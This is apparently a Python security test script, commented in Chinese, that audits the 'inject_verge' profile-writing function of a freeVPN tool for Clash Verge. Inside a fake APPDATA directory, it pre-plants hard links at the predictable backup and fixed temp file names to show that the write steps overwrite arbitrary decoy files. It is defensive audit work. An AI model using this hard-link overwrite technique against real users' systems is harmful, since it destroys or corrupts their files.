# -*- coding: utf-8 -*-
"""C9 · inject_verge 的写入侧

验证:
  C9-a 备份名 profiles.yaml.freevpn.{stamp}.bak 的 stamp 是否可控/可预测
  C9-b 备份名与 tmp 名都是**固定/可预测**的 -> 预置硬链接即可覆盖任意文件
  C9-c `os.replace(tmp, idx)` 在 tmp 被硬链接劫持时的行为
  C9-d d 是否来自 VERGE_DIRS (固定路径), 有没有被输入污染

隔离手段: 在 import pool **之前**把 APPDATA 指向自建目录, 于是 pool.VERGE_DIRS
         全部落在测试目录里 —— 完全不碰用户真实的 Clash Verge 配置。
"""
import http.server
import json
import os
import shutil
import sys
import threading
import time
from datetime import datetime
from pathlib import Path

TMP = Path(r"E:\AI\_c_test")
FAKE_APPDATA = TMP / "appdata_fake"
VERGE = FAKE_APPDATA / "io.github.clash-verge-rev.clash-verge-rev"

if FAKE_APPDATA.exists():
    shutil.rmtree(FAKE_APPDATA, ignore_errors=True)
VERGE.mkdir(parents=True, exist_ok=True)

# ---- 必须在 import pool 之前改环境 ----
os.environ["APPDATA"] = str(FAKE_APPDATA)
sys.path.insert(0, r"E:\AI\freeVPN")
import pool  # noqa: E402
import security as sec  # noqa: E402

PORT = 8899


def banner(t):
    print("\n" + "=" * 72)
    print(t)
    print("=" * 72)


class OK(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = b"proxies: []\n"
        self.send_response(200)
        self.send_header("Content-Type", "text/yaml")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


srv = http.server.ThreadingHTTPServer(("127.0.0.1", PORT), OK)
threading.Thread(target=srv.serve_forever, daemon=True).start()

banner("C9-0 · 隔离确认")
print(f"  pool.VERGE_DIRS =")
for d in pool.VERGE_DIRS:
    print(f"    {d}")
print(f"  find_verge_dir() = {pool.find_verge_dir()}")
print(f"  真实 APPDATA 是否被改写: {os.environ['APPDATA']}")
print(f"  自建 HTTP 服务: http://127.0.0.1:{PORT}/sub/pool.yaml?token=X")

# 准备一个合法的 profiles.yaml
idx = VERGE / "profiles.yaml"
original = {
    "items": [{"uid": "user1", "type": "remote", "name": "用户的订阅",
               "url": "https://example.com/sub", "file": "user1.yaml"}],
    "current": "user1",
}
idx.write_text("# Profiles Config for Clash Verge\n\n"
               + json.dumps(original, ensure_ascii=False, indent=2),
               encoding="utf-8")
print(f"\n  已放置 {idx} ({idx.stat().st_size} 字节)")

SUB = f"http://127.0.0.1:{PORT}/sub/pool.yaml?token=TESTTOKEN"

# ---------------------------------------------------------------------------
banner("C9-a · 备份名与 tmp 名的可预测性")
stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
print(f"  pool.py:2205  stamp = datetime.now().strftime('%Y%m%d-%H%M%S')")
print(f"    现在这一刻的 stamp = {stamp!r}")
print(f"    备份名 = profiles.yaml.freevpn.{stamp}.bak")
print(f"    候选值只有 60*60*24 = 86400 个/天, 逐秒可枚举 —— 不需要任何输入注入")
print(f"  pool.py:2289  tmp = idx.with_name(idx.name + '.freevpn.tmp')")
print(f"    tmp 名 = {idx.name}.freevpn.tmp  —— **完全固定**, 不需要预测")
print(f"  pool.py:2129  d = find_verge_dir() -> VERGE_DIRS 是模块级常量, "
      f"不含任何外部输入")
print(f"    实际用的 d = {pool.find_verge_dir()}")

# ---------------------------------------------------------------------------
banner("C9-b · 预置硬链接 -> 备份步骤覆盖任意文件")
victim_bak = TMP / "victim_backup.txt"
victim_bak.write_text("BACKUP-VICTIM-ORIGINAL-" * 30, encoding="utf-8")
size_bak = victim_bak.stat().st_size

made = []
for delta in (-2, -1, 0, 1, 2):
    ts = datetime.now().timestamp() + delta
    st = datetime.fromtimestamp(ts).strftime("%Y%m%d-%H%M%S")
    p = VERGE / f"profiles.yaml.freevpn.{st}.bak"
    if p.exists():
        p.unlink()
    try:
        os.link(str(victim_bak), str(p))
        made.append(p.name)
    except OSError as e:
        print(f"    {p.name} 建链失败: {e}")
print(f"  预置了 {len(made)} 个硬链接 (覆盖 now±2 秒): {made}")
print(f"  受害者 {victim_bak.name} 原始 {size_bak} 字节, "
      f"nlink={victim_bak.stat().st_nlink}")

# ---------------------------------------------------------------------------
banner("C9-c · 预置硬链接 -> tmp 步骤覆盖任意文件")
victim_tmp = TMP / "victim_tmp.txt"
victim_tmp.write_text("TMP-VICTIM-ORIGINAL-" * 30, encoding="utf-8")
size_tmp = victim_tmp.stat().st_size
tmp_path = VERGE / (idx.name + ".freevpn.tmp")
if tmp_path.exists():
    tmp_path.unlink()
os.link(str(victim_tmp), str(tmp_path))
print(f"  {tmp_path.name}  ->  {victim_tmp.name}")
print(f"  受害者 {victim_tmp.name} 原始 {size_tmp} 字节, "
      f"nlink={victim_tmp.stat().st_nlink}")

# ---------------------------------------------------------------------------
banner("C9-d · 实跑 pool.inject_verge(sub_url)")
print(f"  (会自动跳过真实客户端重启: restart_client 默认 False)")
ret = pool.inject_verge(SUB, activate=False, restart_client=False)
print(f"\n  inject_verge 返回: {ret}")

after_bak = victim_bak.stat()
after_tmp = victim_tmp.stat()
print(f"\n  victim_backup.txt: {size_bak} -> {after_bak.st_size} 字节")
print(f"    内容头: "
      f"{victim_bak.read_bytes()[:80]!r}")
print(f"  victim_tmp.txt:    {size_tmp} -> {after_tmp.st_size} 字节")
print(f"    内容头: {victim_tmp.read_bytes()[:80]!r}")

print(f"\n  备份步骤覆盖受害者文件: {after_bak.st_size != size_bak}")
print(f"  tmp 步骤覆盖受害者文件: {after_tmp.st_size != size_tmp}")

banner("C9-e · 结果目录状态")
for f in sorted(VERGE.iterdir()):
    print(f"  {f.name}  ({f.stat().st_size} 字节, nlink={f.stat().st_nlink})")
print(f"\n  profiles.yaml 现在:")
print(idx.read_text(encoding="utf-8")[:600])
print(f"\n  profiles/ 目录: "
      f"{[p.name for p in (VERGE / 'profiles').iterdir()] if (VERGE / 'profiles').exists() else '(没有)'}")

# ---------------------------------------------------------------------------
banner("C9-f · 并发写入: 固定 tmp 名导致的互相踩踏")
print("  tmp 名固定 = profiles.yaml.freevpn.tmp")
print("  两个进程同时 inject_verge 会写同一个 tmp 再各自 os.replace:")
print("    进程 A 写完 tmp -> 进程 B 覆盖 tmp -> A 的 replace 把 B 的内容搬走")
print("  (静态结论: 由 pool.py:2289 的固定名直接推出; 未做并发实跑以避免")
print("   在测试目录里制造不确定状态)")

srv.shutdown()
print("\n" + "=" * 72)
print("C9 完成")
print("=" * 72)
